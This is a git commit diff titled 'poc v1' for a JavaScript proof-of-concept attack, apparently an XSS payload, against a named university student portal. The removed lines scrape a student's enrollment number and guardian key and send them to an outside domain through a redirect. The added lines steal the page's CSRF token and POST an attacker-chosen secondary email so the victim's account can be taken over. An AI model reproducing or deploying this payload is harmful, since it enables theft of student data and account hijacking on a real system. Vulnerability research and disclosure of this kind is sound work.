8a30a5eb1c2da4ad9ce0e583564cd1f59b01ce65
Jao42 <joaovictormedeiros41@gmail.com>
2023-11-12 16:33:44 -0300

    poc v1

--- a.js
+++ a.js
@@ -1,18 +1,33 @@
-fetch('/edu/aluno/202010040036/?tab=dados_pessoais')
-    .then(function(response) {
-        return response.text()
-    })
-    .then(function(html) {
-        let parser = new DOMParser();
-        let doc = parser.parseFromString(html, "text/html");
-        let chaveResponsavel = doc.querySelector('div[data-tab="dados_pessoais"] [class="box "]:nth-child(2) tbody tr:nth-child(4) :nth-child(2)').textContent
-        let matricula = doc.querySelector('tbody tr :nth-child(6)').textContent
+let EMAIL_ATACANTE = 'primeiro_ato@gmail.com'
 
-        window.location = 'https://jao42.dev.br/?matricula=' + matricula + '&chave_responsavel=' + chaveResponsavel
-    })
-    .catch(function(err) {  
-        console.log('Failed to fetch page: ', err);  
-    });
-
+fetch("https://suap.ifpb.edu.br/comum/atualizar_email_secundario/183224/")
+  .then(function(response){
+    return response.text()
+  })
+  .then(
+    function(html){
+      let parser = new DOMParser();
+      let paginaTrocaEmail = parser.parseFromString(html, "text/html");
+      csrftoken=paginaTrocaEmail.querySelector("input[name='csrfmiddlewaretoken']").value;
+      fetch("https://suap.ifpb.edu.br/comum/atualizar_email_secundario/183224/", {
+      "credentials": "include",
+      "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0",
+          "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+          "Accept-Language": "en-US,pt-BR;q=0.8,pt;q=0.5,en;q=0.3",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Upgrade-Insecure-Requests": "1",
+          "Sec-Fetch-Dest": "document",
+          "Sec-Fetch-Mode": "navigate",
+          "Sec-Fetch-Site": "same-origin",
+          "Sec-Fetch-User": "?1"
+      },
+      "referrer": "https://suap.ifpb.edu.br/comum/atualizar_email_secundario/183224/",
+      "body": "csrfmiddlewaretoken=" + csrftoken + "&email_secundario=" + EMAIL_ATACANTE + "&atualizaremailaluno_form=Aguarde...",
+      "method": "POST",
+      "mode": "cors"
+      });
+    }
+  );
 
 
